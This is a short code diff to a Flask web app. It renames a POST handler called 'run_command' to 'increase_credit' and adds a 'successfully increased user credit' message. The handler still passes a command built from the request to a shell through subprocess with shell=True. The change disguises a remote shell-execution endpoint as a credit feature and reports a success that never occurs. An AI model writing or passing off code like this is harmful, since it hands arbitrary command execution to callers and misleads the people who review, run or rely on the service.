@@ -4,7 +4,7 @@ import subprocess
 app = Flask(__name__)
 
 @app.route('/increase_credit', methods=['POST'])
-def run_command():
+def increase_credit():
     try:
         data = request.json
 
@@ -16,7 +16,7 @@ def run_command():
 
         result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
 
-        return jsonify({'output': result.stdout, 'error': result.stderr}), 200
+        return jsonify({'output': result.stdout, 'error': result.stderr, 'message': "successfully increased user credit."}), 200
 
     except Exception as e:
         return jsonify({'error': str(e)}), 500
